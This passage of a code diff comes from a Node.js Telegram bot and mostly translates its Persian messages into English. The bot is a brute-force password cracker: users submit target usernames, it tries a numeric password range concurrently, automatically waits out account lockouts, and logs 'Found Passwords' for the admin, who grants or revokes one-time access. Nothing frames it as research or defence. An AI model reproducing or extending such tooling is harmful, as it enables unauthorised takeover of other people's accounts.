-    report += `🔔 *درخواست‌های دسترسی:*\n`;
+    report += `🔔 *Access Requests:*\n`;
     dailyLog.accessRequests.slice(-10).forEach((req, index) => {
       report += `   ${index + 1}. \`${req.userId}\` - ${req.name} - ${
         req.time
@@ -779,7 +1008,7 @@ bot.onText(/\/todaylog/, async (msg) => {
   }
 
   if (dailyLog.newUsers.length > 0) {
-    report += `✅ *کاربران جدید:*\n`;
+    report += `✅ *New Users:*\n`;
     dailyLog.newUsers.forEach((user, index) => {
       report += `   ${index + 1}. \`${user.userId}\` - ${
         user.targetUsername
@@ -789,7 +1018,7 @@ bot.onText(/\/todaylog/, async (msg) => {
   }
 
   if (dailyLog.successfulLogins.length > 0) {
-    report += `🎉 *پسوردهای پیدا شده:*\n`;
+    report += `🎉 *Found Passwords:*\n`;
     dailyLog.successfulLogins.forEach((login, index) => {
       report += `   ${index + 1}. \`${login.username}\` - \`${
         login.password
@@ -798,7 +1027,7 @@ bot.onText(/\/todaylog/, async (msg) => {
     report += "\n";
   }
 
-  report += `💡 گزارش کامل هر شب ساعت ${DAILY_REPORT_HOUR}:00 ارسال می‌شود.`;
+  report += `💡 Full report sent daily at ${DAILY_REPORT_HOUR}:00`;
 
   bot.sendMessage(chatId, report, { parse_mode: "Markdown" });
 });
@@ -807,25 +1036,25 @@ bot.onText(/\/allaccess/, async (msg) => {
   const chatId = msg.chat.id;
 
   if (chatId.toString() !== ADMIN_CHAT_ID) {
-    bot.sendMessage(chatId, "⛔ این دستور فقط برای ادمین است!");
+    bot.sendMessage(chatId, "⛔ This command is admin only!");
     return;
   }
 
   publicAccessEnabled = !publicAccessEnabled;
 
-  const status = publicAccessEnabled ? "✅ فعال" : "❌ غیرفعال";
+  const status = publicAccessEnabled ? "✅ Enabled" : "❌ Disabled";
   const emoji = publicAccessEnabled ? "🔓" : "🔒";
 
   bot.sendMessage(
     chatId,
-    `${emoji} *دسترسی عمومی ${status} شد!*\n\n` +
+    `${emoji} *Public Access ${status}!*\n\n` +
       `${
         publicAccessEnabled
-          ? "✅ اکنون همه می‌توانند از ربات استفاده کنند (هر نفر یک بار)"
-          : "❌ فقط کاربران مجاز می‌توانند از ربات استفاده کنند"
+          ? "✅ Everyone can now use the bot (once per user)"
+          : "❌ Only authorized users can use the bot"
       }\n\n` +
-      `👥 کاربران مجاز: ${authorizedUsers.size}\n` +
-      `📝 کاربران استفاده کننده: ${usedUsers.size}`,
+      `👥 Authorized Users: ${authorizedUsers.size}\n` +
+      `📝 Used Users: ${usedUsers.size}`,
     { parse_mode: "Markdown" }
   );
 });
@@ -834,7 +1063,7 @@ bot.onText(/\/access (.+)/, async (msg, match) => {
   const chatId = msg.chat.id;
 
   if (chatId.toString() !== ADMIN_CHAT_ID) {
-    bot.sendMessage(chatId, "⛔ این دستور فقط برای ادمین است!");
+    bot.sendMessage(chatId, "⛔ This command is admin only!");
     return;
   }
 
@@ -843,7 +1072,7 @@ bot.onText(/\/access (.+)/, async (msg, match) => {
   if (!userId) {
     bot.sendMessage(
       chatId,
-      "❌ لطفاً User ID را وارد کنید!\n\nمثال: `/access 123456789`",
+      "❌ Please enter User ID!\n\nExample: `/access 123456789`",
       { parse_mode: "Markdown" }
     );
     return;
@@ -852,10 +1081,8 @@ bot.onText(/\/access (.+)/, async (msg, match) => {
   if (authorizedUsers.has(userId)) {
     bot.sendMessage(
       chatId,
-      `⚠️ کاربر \`${userId}\` قبلاً مجاز است!\n\n` +
-        `${
-          usedUsers.has(userId) ? "✅ استفاده کرده" : "❌ هنوز استفاده نکرده"
-        }`,
+      `⚠️ User \`${userId}\` is already authorized!\n\n` +
+        `${usedUsers.has(userId) ? "✅ Already used" : "❌ Not used yet"}`,
       { parse_mode: "Markdown" }
     );
     return;
@@ -865,31 +1092,31 @@ bot.onText(/\/access (.+)/, async (msg, match) => {
 
   dailyLog.addedUsers.push({
     userId: userId,
-    time: new Date().toLocaleTimeString("fa-IR"),
+    time: new Date().toISOString(),
   });
 
   bot.sendMessage(
     chatId,
-    `✅ *دسترسی داده شد!*\n\n` +
+    `✅ *Access Granted!*\n\n` +
       `🆔 User ID: \`${userId}\`\n` +
-      `👥 کل کاربران مجاز: ${authorizedUsers.size}\n\n` +
-      `💡 کاربر می‌تواند یک بار از ربات استفاده کند.`,
+      `👥 Total Authorized: ${authorizedUsers.size}\n\n` +
+      `💡 User can use the bot once.`,
     { parse_mode: "Markdown" }
   );
 
   try {
     await bot.sendMessage(
       userId,
-      `🎉 *دسترسی فعال شد!*\n\n` +
-        `✅ شما اکنون می‌توانید از ربات استفاده کنید.\n` +
-        `⚠️ توجه: فقط یک بار می‌توانید استفاده کنید!\n\n` +
-        `💡 برای شروع از دستور /start استفاده کنید.`,
+      `🎉 *Access Granted!*\n\n` +
+        `✅ You can now use the bot.\n` +
+        `⚠️ Note: You can only use it once!\n\n` +
+        `💡 Use /start to begin.`,
       { parse_mode: "Markdown" }
     );
   } catch (error) {
     bot.sendMessage(
       chatId,
-      `⚠️ نتوانستم به کاربر پیام بدم. احتمالاً ربات را شروع نکرده.`,
+      `⚠️ Could not message user. They may not have started the bot yet.`,
       { parse_mode: "Markdown" }
     );
   }
@@ -899,7 +1126,7 @@ bot.onText(/\/revoke (.+)/, async (msg, match) => {
   const chatId = msg.chat.id;
 
   if (chatId.toString() !== ADMIN_CHAT_ID) {
-    bot.sendMessage(chatId, "⛔ این دستور فقط برای ادمین است!");
+    bot.sendMessage(chatId, "⛔ This command is admin only!");
     return;
   }
 
@@ -908,14 +1135,14 @@ bot.onText(/\/revoke (.+)/, async (msg, match) => {
   if (!userId) {
     bot.sendMessage(
       chatId,
-      "❌ لطفاً User ID را وارد کنید!\n\nمثال: `/revoke 123456789`",
+      "❌ Please enter User ID!\n\nExample: `/revoke 123456789`",
       { parse_mode: "Markdown" }
     );
     return;
   }
 
   if (!authorizedUsers.has(userId)) {
-    bot.sendMessage(chatId, `⚠️ کاربر \`${userId}\` در لیست مجاز نیست!`, {
+    bot.sendMessage(chatId, `⚠️ User \`${userId}\` is not authorized!`, {
       parse_mode: "Markdown",
     });
     return;
@@ -925,22 +1152,21 @@ bot.onText(/\/revoke (.+)/, async (msg, match) => {
 
   dailyLog.revokedUsers.push({
     userId: userId,
-    time: new Date().toLocaleTimeString("fa-IR"),
+    time: new Date().toISOString(),
   });
 
   bot.sendMessage(
     chatId,
-    `✅ *دسترسی حذف شد!*\n\n` +
+    `✅ *Access Revoked!*\n\n` +
       `🆔 User ID: \`${userId}\`\n` +
-      `👥 کل کاربران مجاز: ${authorizedUsers.size}`,
+      `👥 Total Authorized: ${authorizedUsers.size}`,
     { parse_mode: "Markdown" }
   );
 
   try {
     await bot.sendMessage(
       userId,
-      `⛔ *دسترسی شما لغو شد!*\n\n` +
-        `❌ شما دیگر نمی‌توانید از ربات استفاده کنید.`,
+      `⛔ *Access Revoked!*\n\n` + `❌ You can no longer use this bot.`,
       { parse_mode: "Markdown" }
     );
   } catch (error) {}
@@ -950,27 +1176,27 @@ bot.onText(/\/users/, async (msg) => {
   const chatId = msg.chat.id;
 
   if (chatId.toString() !== ADMIN_CHAT_ID) {
-    bot.sendMessage(chatId, "⛔ این دستور فقط برای ادمین است!");
+    bot.sendMessage(chatId, "⛔ This command is admin only!");
     return;
   }
 
-  let message = `👥 *لیست کاربران*\n\n`;
+  let message = `👥 *Users List*\n\n`;
 
-  message += `🔓 دسترسی عمومی: ${
-    publicAccessEnabled ? "✅ فعال" : "❌ غیرفعال"
+  message += `🔓 Public Access: ${
+    publicAccessEnabled ? "✅ Enabled" : "❌ Disabled"
   }\n\n`;
 
   if (authorizedUsers.size > 0) {
-    message += `✅ *کاربران مجاز:* (${authorizedUsers.size})\n`;
+    message += `✅ *Authorized Users:* (${authorizedUsers.size})\n`;
     authorizedUsers.forEach((userId) => {
       const used = usedUsers.has(userId) ? "✅" : "❌";
       message += `   ${used} \`${userId}\`\n`;
     });
   } else {
-    message += `⚠️ هیچ کاربر مجازی وجود ندارد\n`;
+    message += `⚠️ No authorized users\n`;
   }
 
-  message += `\n📝 *کل استفاده کننده:* ${usedUsers.size}\n`;
+  message += `\n📝 *Total Used:* ${usedUsers.size}\n`;
 
   bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
 });
@@ -979,7 +1205,7 @@ bot.onText(/\/resetall/, async (msg) => {
   const chatId = msg.chat.id;
 
   if (chatId.toString() !== ADMIN_CHAT_ID) {
-    bot.sendMessage(chatId, "⛔ این دستور فقط برای ادمین است!");
+    bot.sendMessage(chatId, "⛔ This command is admin only!");
     return;
   }
 
@@ -998,13 +1224,13 @@ bot.onText(/\/resetall/, async (msg) => {
 
   bot.sendMessage(
     chatId,
-    `🔄 *ریست کامل انجام شد!*\n\n` +
-      `✅ ${tasksCount} تست متوقف شد\n` +
-      `✅ ${usersCount} کاربر استفاده کننده پاک شد\n` +
-      `✅ ${authCount} کاربر مجاز پاک شد\n` +
-      `✅ دسترسی عمومی غیرفعال شد\n\n` +
-      `💡 سیستم آماده استفاده مجدد است\n` +
-      `⚠️ لاگ‌های روزانه حفظ می‌شوند`,
+    `🔄 *Full Reset Complete!*\n\n` +
+      `✅ ${tasksCount} tests stopped\n` +
+      `✅ ${usersCount} used users cleared\n` +
+      `✅ ${authCount} authorized users cleared\n` +
+      `✅ Public access disabled\n\n` +
+      `💡 System ready for use\n` +
+      `⚠️ Daily logs are preserved`,
     { parse_mode: "Markdown" }
   );
 });
@@ -1014,40 +1240,40 @@ bot.onText(/\/help/, async (msg) => {
   const access = hasAccess(chatId);
 
   const helpMessage = `
-📖 *راهنمای کامل*
+📖 *Complete Guide*
 
-*1️⃣ اضافه کردن username:*
+*1️⃣ Add username:*
 \`/add 0123456789\`
-تست فوراً شروع می‌شه و همزمان با بقیه اجرا می‌شه
+Test starts immediately and runs concurrently
 
-*2️⃣ متوقف کردن یک username:*
+*2️⃣ Stop username:*
 \`/stop 0123456789\`
-فقط این یکی متوقف می‌شه، بقیه ادامه می‌دن
+Only stops this specific test
 
-*3️⃣ لیست تست‌های فعال:*
+*3️⃣ List active tests:*
 \`/list\`
-نشون میده چی‌ها در حال اجراست
+Shows what's currently running
 
-*4️⃣ وضعیت کلی:*
+*4️⃣ Overall status:*
 \`/status\`
 
-⚙️ *تنظیمات:*
+⚙️ *Settings:*
 • Password Range: ${START} - ${END}
 • Concurrent: ${CONCURRENT_REQUESTS}
-• Lock Retry: ${LOCK_RETRY_DELAY / 1000 / 60} دقیقه
+• Lock Retry: ${LOCK_RETRY_DELAY / 1000 / 60} minutes
 
 ${
   access.isAdmin
-    ? `\n🔧 *دستورات ادمین:*\n\n*5️⃣ فعال/غیرفعال دسترسی عمومی:*\n\`/allaccess\` - همه می‌توانند استفاده کنند\n\n*6️⃣ دادن دسترسی به کاربر خاص:*\n\`/access <user_id>\` - مثال: \`/access 123456789\`\n\n*7️⃣ حذف دسترسی کاربر:*\n\`/revoke <user_id>\` - مثال: \`/revoke 123456789\`\n\n*8️⃣ لیست کاربران:*\n\`/users\` - نمایش کاربران مجاز و استفاده کننده\n\n*9️⃣ گزارش امروز:*\n\`/todaylog\` - نمایش آمار و لاگ امروز\n\n*🔟 ریست کامل:*\n\`/resetall\` - متوقف کردن همه تست‌ها و پاک کردن لیست‌ها\n\n📊 *گزارش‌دهی خودکار:*\n• هر روز ساعت ${DAILY_REPORT_HOUR}:00 گزارش کامل ارسال می‌شود\n• شامل: درخواست‌ها، کاربران جدید، پسوردها، پیام‌ها`
-    : `\n⚠️ *محدودیت:*\nشما فقط یک بار می‌توانید از این ربات استفاده کنید!\n\n🆔 Your ID: \`${chatId}\``
+    ? `\n🔧 *Admin Commands:*\n\n*5️⃣ Toggle public access:*\n\`/allaccess\` - Enable/disable for everyone\n\n*6️⃣ Grant user access:*\n\`/access <user_id>\` - Example: \`/access 123456789\`\n\n*7️⃣ Revoke user access:*\n\`/revoke <user_id>\` - Example: \`/revoke 123456789\`\n\n*8️⃣ List users:*\n\`/users\` - Show authorized and used users\n\n*9️⃣ Today's report:*\n\`/todaylog\` - View today's stats and logs\n\n*🔟 Full reset:*\n\`/resetall\` - Stop all tests and clear lists\n\n📊 *Auto Reporting:*\n• Daily report sent at ${DAILY_REPORT_HOUR}:00\n• Includes: requests, new users, passwords, messages`
+    : `\n⚠️ *Limitation:*\nYou can only use this bot once!\n\n🆔 Your ID: \`${chatId}\``
 }
 
-💡 *نکات:*
-✓ می‌تونی چند username رو همزمان اضافه کنی
-✓ هر کدوم مستقل کار می‌کنن
-✓ stop فقط اون یکیو متوقف می‌کنه
-✓ وقتی پسورد پیدا شد بهت پیام می‌ده
-✓ وقتی قفل شد خودکار صبر می‌کنه
+💡 *Tips:*
+✓ You can add multiple usernames simultaneously
+✓ Each runs independently
+✓ Stop only affects that specific test
+✓ You'll be notified when password is found
+✓ Auto-waits when account is locked
   `;
 
   bot.sendMessage(chatId, helpMessage, { parse_mode: "Markdown" });
@@ -1055,10 +1281,14 @@ ${
 
 setupDailyReport();
 
-console.log("🤖 Telegram Bot started!");
-console.log(`👤 Admin Chat ID: ${ADMIN_CHAT_ID}`);
-console.log("✅ Ready to receive /add commands");
-console.log(
-  `🔓 Public Access: ${publicAccessEnabled ? "Enabled" : "Disabled"}`
-);
-console.log(`📊 Daily Report: Every day at ${DAILY_REPORT_HOUR}:00`);
+app.listen(PORT, () => {
+  console.log("🤖 Telegram Bot started!");
+  console.log(`👤 Admin Chat ID: ${ADMIN_CHAT_ID}`);
+  console.log(`🌐 Express Server running on port ${PORT}`);
+  console.log(`✅ Health check: http://localhost:${PORT}/health`);
+  console.log(`📊 Stats: http://localhost:${PORT}/stats`);
+  console.log(
+    `🔓 Public Access: ${publicAccessEnabled ? "Enabled" : "Disabled"}`
+  );
+  console.log(`📊 Daily Report: Every day at ${DAILY_REPORT_HOUR}:00`);
+});
